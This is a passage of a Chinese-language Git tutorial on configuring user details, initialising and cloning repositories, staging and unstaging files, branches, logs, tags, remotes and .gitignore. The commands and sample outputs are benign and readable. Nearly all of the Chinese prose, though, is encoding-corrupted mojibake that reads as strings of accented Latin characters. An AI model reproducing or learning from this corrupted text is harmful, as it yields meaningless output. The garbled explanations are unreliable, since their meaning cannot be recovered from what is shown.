è£…åœ¨ä»€ä¹ˆç›®å½•ï¼Œå°±ä»¥æ­¤ä½œä¸ºæ ¹ç›®å½•æ¥å®šä½ã€‚\n 1.ç”¨æˆ·ä¿¡æ¯\tgit config user åœ¨ä½¿ç”¨gitæäº¤å‰ï¼Œä¸€å®šè¦é…ç½®æäº¤è€…ä¸ªäººçš„ç”¨æˆ·åç§°å’Œç”µå­é‚®ä»¶\n1 2  $ git config --global user.name \"wyndam\" $ git config --global user.email \"only.night@qq.com\"   å¦‚æœç”¨äº†*--global*é€‰é¡¹ï¼Œé‚£ä¹ˆæ›´æ”¹çš„é…ç½®æ–‡ä»¶å°±æ˜¯ä½äºä½ ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„é‚£ä¸ªï¼Œä»¥åä½ æ‰€æœ‰çš„é¡¹ç›®éƒ½ä¼šé»˜è®¤ä½¿ç”¨è¿™é‡Œé…ç½®çš„ç”¨æˆ·ä¿¡æ¯ã€‚ å¦‚æœè¦åœ¨æŸä¸ªç‰¹å®šçš„é¡¹ç›®ä¸­ä½¿ç”¨å…¶ä»–åå­—æˆ–è€…ç”µé‚®ï¼Œåªè¦å»æ‰*â€“global*é€‰é¡¹é‡æ–°é…ç½®å³å¯ï¼Œæ–°çš„è®¾å®šä¿å­˜åœ¨å½“å‰é¡¹ç›®çš„ .git/config æ–‡ä»¶é‡Œã€‚\n2.æ–‡æœ¬ç¼–è¾‘å™¨ è®¾ç½®Gité»˜è®¤ä½¿ç”¨çš„æ–‡æœ¬ç¼–è¾‘å™¨, ä¸€èˆ¬å¯èƒ½ä¼šæ˜¯ Vi æˆ–è€… Vimã€‚å¦‚æœä½ æœ‰å…¶ä»–åå¥½ï¼Œæ¯”å¦‚ Emacs çš„è¯ï¼Œå¯ä»¥é‡æ–°è®¾ç½®ï¼š\n1  $ git config --global core.editor emacs   3.å·®å¼‚åˆ†æå·¥å…· è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„æ˜¯ï¼Œåœ¨è§£å†³åˆå¹¶å†²çªæ—¶ä½¿ç”¨å“ªç§å·®å¼‚åˆ†æå·¥å…·ã€‚æ¯”å¦‚è¦æ”¹ç”¨ vimdiff çš„è¯ï¼š\n1  $ git config --global merge.tool vimdiff   Git å¯ä»¥ç†è§£ kdiff3ï¼Œtkdiffï¼Œmeldï¼Œxxdiffï¼Œemergeï¼Œvimdiffï¼Œgvimdiffï¼Œecmergeï¼Œå’Œ opendiff ç­‰åˆå¹¶å·¥å…·çš„è¾“å‡ºä¿¡æ¯ã€‚ å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥æŒ‡å®šä½¿ç”¨è‡ªå·±å¼€å‘çš„å·¥å…·ã€‚\n4.æŸ¥çœ‹é…ç½®ä¿¡æ¯\tgit config --list è¦æ£€æŸ¥å·²æœ‰çš„é…ç½®ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ git config â€“list å‘½ä»¤ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  $ git config --list core.symlinks=false core.autocrlf=true color.diff=auto color.status=auto color.branch=auto color.interactive=true pack.packsizelimit=2g help.format=html http.sslcainfo=E:/Platform/Git/mingw32/ssl/certs/ca-bundle.crt diff.astextplain.textconv=astextplain rebase.autosquash=true filter.lfs.clean=git-lfs clean %f filter.lfs.smudge=git-lfs smudge %f filter.lfs.required=true user.name=Wyndam user.email=only.night@qq.com core.editor=subl   æœ‰æ—¶å€™ä¼šçœ‹åˆ°é‡å¤çš„å˜é‡åï¼Œé‚£å°±è¯´æ˜å®ƒä»¬æ¥è‡ªä¸åŒçš„é…ç½®æ–‡ä»¶ï¼ˆæ¯”å¦‚ /etc/gitconfig å’Œ ~/.gitconfigï¼‰ï¼Œä¸è¿‡æœ€ç»ˆ Git å®é™…é‡‡ç”¨çš„æ˜¯æœ€åä¸€ä¸ªã€‚ è¿™äº›é…ç½®æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ ~/.gitconfig æˆ– /etc/gitconfig çœ‹åˆ°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n[filter \"lfs\"] clean = git-lfs clean %f smudge = git-lfs smudge %f required = true [user] name = Wyndam email = only.night@qq.com [core] editor = subl ä¹Ÿå¯ä»¥ç›´æ¥æŸ¥é˜…æŸä¸ªç¯å¢ƒå˜é‡çš„è®¾å®šï¼Œåªè¦æŠŠç‰¹å®šçš„åå­—è·Ÿåœ¨åé¢å³å¯ï¼Œåƒè¿™æ ·ï¼š\n1 2 3  $ git config user.email magic@outlook.com   æ–°å»ºgitæœ¬åœ°ä»“åº“ Git ä½¿ç”¨ git init å‘½ä»¤æ¥åˆå§‹åŒ–ä¸€ä¸ª Git ä»“åº“ï¼ŒGit çš„å¾ˆå¤šå‘½ä»¤éƒ½éœ€è¦åœ¨ Git çš„ä»“åº“ä¸­è¿è¡Œï¼Œæ‰€ä»¥ git init æ˜¯ä½¿ç”¨ Git çš„ç¬¬ä¸€ä¸ªå‘½ä»¤ã€‚ åœ¨æ‰§è¡Œå®Œæˆ git init å‘½ä»¤åï¼ŒGit ä»“åº“ä¼šç”Ÿæˆä¸€ä¸ª .git ç›®å½•ï¼Œè¯¥ç›®å½•åŒ…å«äº†èµ„æºçš„æ‰€æœ‰å…ƒæ•°æ®ï¼Œå…¶ä»–çš„é¡¹ç›®ç›®å½•ä¿æŒä¸å˜ï¼ˆä¸åƒ SVN ä¼šåœ¨æ¯ä¸ªå­ç›®å½•ç”Ÿæˆ .svn ç›®å½•ï¼ŒGit åªåœ¨ä»“åº“çš„æ ¹ç›®å½•ç”Ÿæˆ .git ç›®å½•ï¼‰ã€‚\nåœ¨å·¥ä½œç›®å½•ä¸‹ä½¿ç”¨å‘½ä»¤git init\n1  $git init (path)   è‹¥æ²¡æœ‰æŒ‡å®špathï¼Œåˆ™é»˜è®¤å½“å‰ç›®å½•ä¸‹å»ºç«‹gitä»“åº“ã€‚\nåˆå§‹åŒ–åï¼Œä¼šåœ¨å·¥ä½œç›®å½•ä¸‹ä¼šå‡ºç°ä¸€ä¸ªåä¸º .git çš„ç›®å½•ï¼Œæ‰€æœ‰ Git éœ€è¦çš„æ•°æ®å’Œèµ„æºéƒ½å­˜æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸­ã€‚ å¦‚æœå½“å‰ç›®å½•ä¸‹æœ‰å‡ ä¸ªæ–‡ä»¶æƒ³è¦çº³å…¥ç‰ˆæœ¬æ§åˆ¶ï¼Œéœ€è¦å…ˆç”¨ git add å‘½ä»¤å‘Šè¯‰ Git å¼€å§‹å¯¹è¿™äº›æ–‡ä»¶è¿›è¡Œè·Ÿè¸ªï¼Œç„¶åæäº¤ï¼š\n1 2  $ git add . (path|file) $ git commit -m \"inital commit\"   ä»¥ä¸Šå‘½ä»¤å°±æ˜¯æŠŠæ–‡ä»¶/æ–‡ä»¶å¤¹æäº¤è‡³ä»“åº“ä¸­ï¼Œè‹¥æ˜¯è¿œç¨‹ä»“åº“ï¼Œè¿˜éœ€è¦å‘½ä»¤git\tpush\nå¤åˆ¶è¿œç¨‹ä»“åº“ git clone æˆ‘ä»¬ä½¿ç”¨ git clone ä»ç°æœ‰ Git ä»“åº“ä¸­æ‹·è´é¡¹ç›®ï¼ˆç±»ä¼¼ svn checkoutï¼‰ã€‚ å…‹éš†ä»“åº“çš„å‘½ä»¤æ ¼å¼ä¸º:\n1  $ git clone \u003crepo|url\u003e (\u003cdirectory\u003e)   å‚æ•°è¯´æ˜ï¼š\n\u003crepo|url\u003eï¼šä¸ºGitä»“åº“çš„åœ°å€url\n\u003cdirectory\u003eï¼šä¸ºå°†gitå‚¨å­˜è‡³ç›®æ ‡ç›®å½•ï¼Œè‹¥ä¸ºç©ºï¼Œåˆ™é»˜è®¤æœ¬åœ°ç›®å½•\nGitæ”¯æŒsshï¼Œgitï¼Œhttpå’Œhttpsåè®®ï¼ˆæ­¤å¤–ï¼Œå¯ä»¥ä½¿ç”¨ftpå’Œftpsè¿›è¡Œè·å–ï¼Œä½†è¿™æ•ˆç‡ä½ä¸‹ä¸”ä¸å»ºè®®ä½¿ç”¨ï¼›è¯·å‹¿ä½¿ç”¨å®ƒï¼‰ã€‚\n ssh://[user@]host.xz[:port]/path/to/repo.git/ git://host.xz[:port]/path/to/repo.git/ http[s]://host.xz[:port]/path/to/repo.git/ ftp[s]://host.xz[:port]/path/to/repo.git/  ä¹Ÿå¯ä»¥ç”¨ç±»ä¼¼scpçš„è¯­æ³•è¿›è¡Œcloneï¼ˆå®é™…ä¸Šæ˜¯sshåè®®ï¼‰\n [user@]host.xz:path/to/repo.git/  æŸ¥çœ‹çŠ¶æ€git\tstatus  git status ä»¥æŸ¥çœ‹åœ¨ä½ ä¸Šæ¬¡æäº¤ä¹‹åæ˜¯å¦æœ‰ä¿®æ”¹ã€‚ æˆ‘æ¼”ç¤ºè¯¥å‘½ä»¤çš„æ—¶å€™åŠ äº† -s å‚æ•°ï¼Œä»¥è·å¾—ç®€çŸ­çš„ç»“æœè¾“å‡ºã€‚å¦‚æœæ²¡åŠ è¯¥å‚æ•°ä¼šè¯¦ç»†è¾“å‡ºå†…å®¹ï¼š\n1 2 3 4 5 6 7 8 9 10  $ git status On branch master Initial commit Changes to be committed: (use \"git rm --cached \u003cfile\u003e...\" to unstage) new file: README.md   ä»ç¼“å­˜ä¸­ç§»é™¤æ–‡ä»¶ git reset HEAD git reset HEAD å‘½ä»¤ç”¨äºå–æ¶ˆå·²ç¼“å­˜çš„å†…å®¹ã€‚ æˆ‘ä»¬å…ˆæ”¹åŠ¨æ–‡ä»¶ README æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n1 2 3  #README.md  ##This is readme markdown file   HelloWorld.java æ–‡ä»¶ä¿®æ”¹ä¸ºï¼š\n1 2 3 4 5  public class HelloWorld { public static void main(String[] args) { System.out.println(\"Hello World!\"); } }   ç°åœ¨ä¸¤ä¸ªæ–‡ä»¶ä¿®æ”¹åï¼Œéƒ½æäº¤åˆ°äº†ç¼“å­˜åŒºï¼Œæˆ‘ä»¬ç°åœ¨è¦å–æ¶ˆå…¶ä¸­ä¸€ä¸ªçš„ç¼“å­˜ï¼Œæ“ä½œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  $ git status -s M HelloWorld.java M README.md $ git add . $ git status -s M HelloWorld.java M README.md $ git reset HEAD -- HelloWorld.java Unstaged changes after reset: M HelloWorld.java $ git status -s M HelloWorld.java M README.md   ç°åœ¨æ‰§è¡Œ git commitï¼Œåªä¼šå°† README.md æ–‡ä»¶çš„æ”¹åŠ¨æäº¤ï¼Œè€Œ HelloWorld.java æ˜¯æ²¡æœ‰çš„ã€‚\n1 2 3 4 5  $ git commit -m \"change\" [master ad5f6fe] change 1 file changed, 1 insertion(+), 1 deletion(-) $ git status -s M HelloWorld.java   å¯ä»¥çœ‹åˆ° HelloWorld.java æ–‡ä»¶çš„ä¿®æ”¹å¹¶ä¸ºæäº¤ã€‚ è¿™æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°† HelloWorld.java çš„ä¿®æ”¹æäº¤ï¼š\n1 2 3 4 5 6 7  $ git commit -am \"ä¿®æ”¹ HelloWorld.java æ–‡ä»¶\" [master a055c08] ä¿®æ”¹ HelloWorld.java æ–‡ä»¶ 1 file changed, 1 insertion(+), 1 deletion(-) $ git status On branch master nothing to commit, working directory clean   ç®€è€Œè¨€ä¹‹ï¼Œæ‰§è¡Œ git reset HEAD ä»¥å–æ¶ˆä¹‹å‰ git add æ·»åŠ ï¼Œä½†ä¸å¸Œæœ›åŒ…å«åœ¨ä¸‹ä¸€æäº¤å¿«ç…§ä¸­çš„ç¼“å­˜ã€‚\nä»ç¼“å­˜ä»¥åŠå·¥ä½œç›®å½•åˆ é™¤æ–‡ä»¶ git rm git rm ä¼šå°†æ¡ç›®ä»ç¼“å­˜åŒºä¸­ç§»é™¤ã€‚è¿™ä¸ git reset HEAD å°†æ¡ç›®å–æ¶ˆç¼“å­˜æ˜¯æœ‰åŒºåˆ«çš„ã€‚ â€œå–æ¶ˆç¼“å­˜â€çš„æ„æ€å°±æ˜¯å°†ç¼“å­˜åŒºæ¢å¤ä¸ºæˆ‘ä»¬åšå‡ºä¿®æ”¹ä¹‹å‰çš„æ ·å­ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œgit rm file ä¼šå°†æ–‡ä»¶ä»ç¼“å­˜åŒºå’Œä½ çš„ç¡¬ç›˜ä¸­ï¼ˆå·¥ä½œç›®å½•ï¼‰åˆ é™¤ã€‚ å¦‚æœä½ è¦åœ¨å·¥ä½œç›®å½•ä¸­ç•™ç€è¯¥æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ git rm â€“cachedï¼š å¦‚æˆ‘ä»¬åˆ é™¤ hello.javaæ–‡ä»¶ï¼š(åŒ…æ‹¬åœ¨æœ¬åœ°ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¯èƒ½éœ€è¦é€‰é¡¹**-f**)\n1 2 3 4  $ git rm HelloWorld.java rm 'HelloWorld.java' $ ls README.md   ä¸ä»å·¥ä½œåŒºä¸­åˆ é™¤æ–‡ä»¶ï¼š\n1 2 3 4  $ git rm README.md --cached rm 'README.md' $ ls README.md   ä¿®æ”¹ç¼“å­˜ä¸­æ–‡ä»¶å git mv git mv å‘½ä»¤åšå¾—æ‰€æœ‰äº‹æƒ…å°±æ˜¯ git rm â€“cached å‘½ä»¤çš„æ“ä½œï¼Œ é‡å‘½åç£ç›˜ä¸Šçš„æ–‡ä»¶ï¼Œç„¶åå†æ‰§è¡Œ git add æŠŠæ–°æ–‡ä»¶æ·»åŠ åˆ°ç¼“å­˜åŒºã€‚ æˆ‘ä»¬å…ˆæŠŠåˆšç§»é™¤çš„ README æ·»åŠ å›æ¥ï¼š\n1 2 3 4  $ git add README.md $ git mv README.md README $ ls README    Gitåˆ†æ”¯ç®¡ç† å‡ ä¹æ¯ä¸€ç§ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿéƒ½ä»¥æŸç§å½¢å¼æ”¯æŒåˆ†æ”¯ã€‚ä½¿ç”¨åˆ†æ”¯æ„å‘³ç€ä½ å¯ä»¥ä»å¼€å‘ä¸»çº¿ä¸Šåˆ†ç¦»å¼€æ¥ï¼Œç„¶ååœ¨ä¸å½±å“ä¸»çº¿çš„åŒæ—¶ç»§ç»­å·¥ä½œã€‚ æœ‰äººæŠŠ Git çš„åˆ†æ”¯æ¨¡å‹ç§°ä¸ºâ€å¿…æ€æŠ€ç‰¹æ€§â€ï¼Œè€Œæ­£æ˜¯å› ä¸ºå®ƒï¼Œå°† Git ä»ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿå®¶æ—é‡ŒåŒºåˆ†å‡ºæ¥ã€‚ åˆ›å»ºåˆ†æ”¯å‘½ä»¤ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12  #åˆ›å»ºåˆ†æ”¯ $ git branch [branch name] #åˆ‡æ¢åˆ†æ”¯ $ git checkout [branch name] #åˆ›å»ºå¹¶åˆ‡æ¢åˆ†æ”¯ $ git checkout -b [branch name] #åˆå¹¶åˆ†æ”¯ $ git merge #åˆ é™¤åˆ†æ”¯ $ git branch -d [branch name]   Gitåˆ†æ”¯ç®¡ç† 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  #åˆ—å‡ºé—®é¢˜ $ git branch #æ— å‚æ•°æ—¶ï¼Œè¯¥å‘½ä»¤ä¼šåˆ—å‡ºæœ¬åœ°åˆ†æ”¯ $ git branch * master #åˆ›å»ºåˆ†æ”¯ $ git branch testbranch $ git branch *\tbranch testbranch $ git branch testing $ git branch -D testing Deleted branch testing (was 84b13b9). #åˆå¹¶åˆ†æ”¯,å°†åˆ†æ”¯[branch name] åˆå¹¶åˆ°å½“å‰åˆ†æ”¯ $ git merge [branch name] $ git merge test Updating b04e1bb..d3c2604 Fast-forward testB | 0 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 testB   Git æŸ¥çœ‹æäº¤å†å²\tgit log 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  $ git log commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -\u003e master, origin/test, test) Author: Magic \u003cxxx@qq.com\u003e Date: Sat Sep 28 23:41:42 2019 +0800 ff commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master) Author: Magic \u003cxxx@qq.com\u003e Date: Sat Sep 28 23:40:34 2019 +0800 fuck #å¯ä»¥ç”¨ --oneline é€‰é¡¹æ¥æŸ¥çœ‹å†å²è®°å½•çš„ç®€æ´çš„ç‰ˆæœ¬ $ git log --oneline d3c2604 (HEAD -\u003e master, origin/test, test) ff b04e1bb (origin/master) fuck #å¯ä»¥ç”¨ --graph é€‰é¡¹ï¼ŒæŸ¥çœ‹å†å²ä¸­ä»€ä¹ˆæ—¶å€™å‡ºç°äº†åˆ†æ”¯ã€åˆå¹¶ã€‚ä»¥ä¸‹ä¸ºç›¸åŒçš„å‘½ä»¤ï¼Œå¼€å¯äº†æ‹“æ‰‘å›¾é€‰é¡¹ï¼š $ git log --graph * commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -\u003e master, origin/test, test) | Author: Magic-King \u003cxxx@qq.com\u003e | Date: Sat Sep 28 23:41:42 2019 +0800 | | ff | * commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master) Author: Magic-King \u003cxxx@qq.com\u003e Date: Sat Sep 28 23:40:34 2019 +0800 fuck #å¯ä»¥ç”¨ â€˜--reverseâ€™å‚æ•°æ¥é€†å‘æ˜¾ç¤ºæ‰€æœ‰æ—¥å¿— $ git log --reverse commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master) Author: Magic-King \u003cxxx@qq.com\u003e Date: Sat Sep 28 23:40:34 2019 +0800 fuck commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -\u003e master, origin/test, test) Author: Magic-King \u003cxxx@qq.com\u003e Date: Sat Sep 28 23:41:42 2019 +0800 ff   Git æ ‡ç­¾ git tag å¦‚æœè¾¾åˆ°ä¸€ä¸ªé‡è¦çš„é˜¶æ®µï¼Œå¹¶å¸Œæœ›æ°¸è¿œè®°ä½é‚£ä¸ªç‰¹åˆ«çš„æäº¤å¿«ç…§ï¼Œå¯ä»¥ä½¿ç”¨ git tag ç»™å®ƒæ‰“ä¸Šæ ‡ç­¾ã€‚ æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬æƒ³ä¸ºæˆ‘ä»¬çš„é¡¹ç›®å‘å¸ƒä¸€ä¸ªâ€1.0â€ç‰ˆæœ¬ã€‚ å¯ä»¥ç”¨ git tag -a v1.0 å‘½ä»¤ç»™æœ€æ–°ä¸€æ¬¡æäº¤æ‰“ä¸Šï¼ˆHEADï¼‰â€v1.0â€çš„æ ‡ç­¾ã€‚ -a é€‰é¡¹æ„ä¸ºâ€åˆ›å»ºä¸€ä¸ªå¸¦æ³¨è§£çš„æ ‡ç­¾â€ã€‚ ä¸ç”¨ -a é€‰é¡¹ä¹Ÿå¯ä»¥æ‰§è¡Œçš„ï¼Œä½†å®ƒä¸ä¼šè®°å½•è¿™æ ‡ç­¾æ˜¯å•¥æ—¶å€™æ‰“çš„ï¼Œè°æ‰“çš„ï¼Œä¹Ÿä¸ä¼šè®©ä½ æ·»åŠ ä¸ªæ ‡ç­¾çš„æ³¨è§£ã€‚ æˆ‘æ¨èä¸€ç›´åˆ›å»ºå¸¦æ³¨è§£çš„æ ‡ç­¾ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  $ git log --oneline --graph --decorate * 2b5970d (HEAD -\u003e master, tag: v1.0) Merge branch 'change_site' |\\ | * d17a0a0 (change_site) change the site * | e2714c9 æ–°å¢åŠ ä¸€è¡Œ |/ * 202199d (newtest) add test.txt file * a055c08 ä¿®æ”¹ HelloWorld.java æ–‡ä»¶ * ad5f6fe ä¿®æ”¹ * c2c167c ä¿®æ”¹HelloWorld.javaæ–‡ä»¶ * f9393bf third commit `` * 316fafc second commit * fdd5c53 inital commit   å¦‚æœæˆ‘ä»¬å¿˜äº†ç»™æŸä¸ªæäº¤æ‰“æ ‡ç­¾ï¼Œåˆå°†å®ƒå‘å¸ƒäº†ï¼Œæˆ‘ä»¬å¯ä»¥ç»™å®ƒè¿½åŠ æ ‡ç­¾ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬å‘å¸ƒäº†æäº¤ 85fc7e7(ä¸Šé¢å®ä¾‹æœ€åä¸€è¡Œ)ï¼Œä½†æ˜¯é‚£æ—¶å€™å¿˜äº†ç»™å®ƒæ‰“æ ‡ç­¾ã€‚ æˆ‘ä»¬ç°åœ¨ä¹Ÿå¯ä»¥ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  $ git tag -a v0.9 a055c08 $ git log --oneline --graph --decorate * 2b5970d (HEAD -\u003e master, tag: v1.0) Merge branch 'change_site' |\\ | * d17a0a0 (change_site) change the site * | e2714c9 æ–°å¢åŠ ä¸€è¡Œ |/ * 202199d (newtest) add test.txt file * a055c08 (tag: v0.9) ä¿®æ”¹ HelloWorld.java æ–‡ä»¶ * ad5f6fe ä¿®æ”¹ * c2c167c ä¿®æ”¹HelloWorld.javaæ–‡ä»¶ * f9393bf third commit `` * 316fafc second commit * fdd5c53 inital commit   å¦‚æœè¦æŸ¥çœ‹æ‰€æœ‰æ ‡ç­¾å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š\n1  $ git tag   æŒ‡å®šæ ‡ç­¾ä¿¡æ¯å‘½ä»¤ï¼š\n1  git tag -a \u003ctagname\u003e -m \"æ ‡ç­¾\"   PGPç­¾åæ ‡ç­¾å‘½ä»¤ï¼š\n1  git tag -s \u003ctagname\u003e -m \"æ ‡ç­¾\"   Git è¿œç¨‹ä»“åº“çš„æ“ä½œ æŸ¥çœ‹å½“å‰è¿œç¨‹åº“ 1 2 3 4 5  $ git remote origin $ git remote -v origin git@xx.xx.xxx.xxx:/test.git (fetch) origin git@xx.xx.xxx.xxx:/test.git (push)   æå–è¿œç¨‹åº“ 1  $ git pull   è¯¥å‘½ä»¤å°±æ˜¯åœ¨æ‰§è¡Œ git fetch ä¹‹åç´§æ¥ç€æ‰§è¡Œ git merge è¿œç¨‹åˆ†æ”¯åˆ°ä½ æ‰€åœ¨çš„ä»»æ„åˆ†æ”¯ã€‚ å‡è®¾ä½ é…ç½®å¥½äº†ä¸€ä¸ªè¿œç¨‹ä»“åº“ï¼Œå¹¶ä¸”ä½ æƒ³è¦æå–æ›´æ–°çš„æ•°æ®ï¼Œä½ å¯ä»¥é¦–å…ˆæ‰§è¡Œ git fetch [alias] å‘Šè¯‰ Git å»è·å–å®ƒæœ‰ä½ æ²¡æœ‰çš„æ•°æ®ï¼Œç„¶åä½ å¯ä»¥æ‰§è¡Œ git merge [alias]/[branch] ä»¥å°†æœåŠ¡å™¨ä¸Šçš„ä»»ä½•æ›´æ–°ï¼ˆå‡è®¾æœ‰äººè¿™æ—¶å€™æ¨é€åˆ°æœåŠ¡å™¨äº†ï¼‰åˆå¹¶åˆ°ä½ çš„å½“å‰åˆ†æ”¯ã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬åœ¨ Github ä¸Šç‚¹å‡»â€test.txtâ€ å¹¶åœ¨çº¿ä¿®æ”¹å®ƒã€‚ä¹‹åæˆ‘ä»¬åœ¨æœ¬åœ°æ›´æ–°ä¿®æ”¹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13  $ git fetch origin remote: Counting objects: 3, done. remote: Compressing objects: 100% (3/3), done. remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 Unpacking objects: 100% (3/3), done. From github.com:onlynight/GitAdd 774112b..37be49b master -\u003e origin/master $ git merge origin/master Updating 774112b..37be49b Fast-forward test.txt | 1 + 1 file changed, 1 insertion(+)   æ¨é€è¿œç¨‹åº“ æ¨é€ä½ çš„æ–°åˆ†æ”¯ä¸æ•°æ®åˆ°æŸä¸ªè¿œç«¯ä»“åº“å‘½ä»¤\n1 2 3 4 5  #è¯¥å‘½ä»¤å°†ä½ çš„ [branch] åˆ†æ”¯æ¨é€æˆä¸º [alias] è¿œç¨‹ä»“åº“ä¸Šçš„ [branch] åˆ†æ”¯ $ git push [alias] [branch] $ git push origin master Everything up-to-date   åˆ é™¤è¿œç¨‹åˆ†æ”¯ æ³¨æ„ï¼šå¦‚æœè¦åˆ é™¤è¿œç¨‹åˆ†æ”¯åŒæ ·ä¹Ÿæ˜¯ä½¿ç”¨pushå‘½ä»¤ï¼Œåœ¨åˆ†æ”¯å‰åŠ ä¸Šâ€:â€è¡¨ç¤ºåˆ é™¤è¿œç¨‹åˆ†æ”¯ï¼Œä»£ç å¦‚ä¸‹\n1  $ git push origin :\u003cbranch name\u003e   åˆ é™¤æœ¬åœ°ä»“åº“çš„è¿œç¨‹ä»“åº“é“¾æ¥ åˆ é™¤è¿œç¨‹ä»“åº“ä½ å¯ä»¥ä½¿ç”¨å‘½ä»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  git remote rm [alias] $ git remote -v origin git@github.com:onlynight/GitAdd.git (fetch) origin git@github.com:onlynight/GitAdd.git (push) $ git remote -v origin git@github.com:onlynight/GitAdd.git (fetch) origin git@github.com:onlynight/GitAdd.git (push) origin2 git@github.com:onlnynight/GitAdd.git (fetch) origin2 git@github.com:onlnynight/GitAdd.git (push) $ git remote rm origin2 $ git remote -v origin git@github.com:onlynight/GitAdd.git (fetch) origin git@github.com:onlynight/GitAdd.git (push)   å¿½ç•¥ç‰¹æ®Šæ–‡ä»¶ æœ‰äº›æ—¶å€™ï¼Œä½ å¿…é¡»æŠŠæŸäº›æ–‡ä»¶æ”¾åˆ°Gitå·¥ä½œç›®å½•ä¸­ï¼Œä½†åˆä¸èƒ½æäº¤å®ƒä»¬ï¼Œæ¯”å¦‚ä¿å­˜äº†æ•°æ®åº“å¯†ç çš„é…ç½®æ–‡ä»¶å•¦ï¼Œç­‰ç­‰ï¼Œæ¯æ¬¡git statuséƒ½ä¼šæ˜¾ç¤ºUntracked files ...ï¼Œæœ‰å¼ºè¿«ç—‡çš„ç«¥é‹å¿ƒé‡Œè‚¯å®šä¸çˆ½ã€‚\nå¥½åœ¨Gitè€ƒè™‘åˆ°äº†å¤§å®¶çš„æ„Ÿå—ï¼Œè¿™ä¸ªé—®é¢˜è§£å†³èµ·æ¥ä¹Ÿå¾ˆç®€å•ï¼Œåœ¨Gitå·¥ä½œåŒºçš„æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç‰¹æ®Šçš„.gitignoreæ–‡ä»¶ï¼Œç„¶åæŠŠè¦å¿½ç•¥çš„æ–‡ä»¶åå¡«è¿›å»ï¼ŒGitå°±ä¼šè‡ªåŠ¨å¿½ç•¥è¿™äº›æ–‡ä»¶ã€‚\nä¸éœ€è¦ä»å¤´å†™.gitignoreæ–‡ä»¶ï¼ŒGitHubå·²ç»ä¸ºæˆ‘ä»¬å‡†å¤‡äº†å„ç§é…ç½®æ–‡ä»¶ï¼Œåªéœ€è¦ç»„åˆä¸€ä¸‹å°±å¯ä»¥ä½¿ç”¨äº†ã€‚æ‰€æœ‰é…ç½®æ–‡ä»¶å¯ä»¥ç›´æ¥åœ¨çº¿æµè§ˆï¼šhttps://github.com/github/gitignore\nå¿½ç•¥æ–‡ä»¶çš„åŸåˆ™æ˜¯ï¼š\n å¿½ç•¥æ“ä½œç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆçš„æ–‡ä»¶ï¼Œæ¯”å¦‚ç¼©ç•¥å›¾ç­‰ï¼› å¿½ç•¥ç¼–è¯‘ç”Ÿæˆçš„ä¸­é—´æ–‡ä»¶ã€å¯æ‰§è¡Œæ–‡ä»¶ç­‰ï¼Œä¹Ÿå°±æ˜¯å¦‚æœä¸€ä¸ªæ–‡ä»¶æ˜¯é€šè¿‡å¦ä¸€ä¸ªæ–‡ä»¶è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œé‚£è‡ªåŠ¨ç”Ÿæˆçš„æ–‡ä»¶å°±æ²¡å¿…è¦æ”¾è¿›ç‰ˆæœ¬åº“ï¼Œæ¯”å¦‚Javaç¼–è¯‘äº§ç”Ÿçš„.classæ–‡ä»¶ï¼› å¿½ç•¥ä½ è‡ªå·±çš„å¸¦æœ‰æ•æ„Ÿä¿¡æ¯çš„é…ç½®æ–‡ä»¶ï¼Œæ¯”å¦‚å­˜æ”¾å£ä»¤çš„é…ç½®æ–‡ä»¶ã€‚  ä¸¾ä¸ªä¾‹å­ï¼š\nå‡è®¾ä½ åœ¨Windowsä¸‹è¿›è¡ŒPythonå¼€å‘ï¼ŒWindowsä¼šè‡ªåŠ¨åœ¨æœ‰å›¾ç‰‡çš„ç›®å½•ä¸‹ç”Ÿæˆéšè—çš„ç¼©ç•¥å›¾æ–‡ä»¶ï¼Œå¦‚æœæœ‰è‡ªå®šä¹‰ç›®å½•ï¼Œç›®å½•ä¸‹å°±ä¼šæœ‰Desktop.iniæ–‡ä»¶ï¼Œå› æ­¤ä½ éœ€è¦å¿½ç•¥Windowsè‡ªåŠ¨ç”Ÿæˆçš„åƒåœ¾æ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  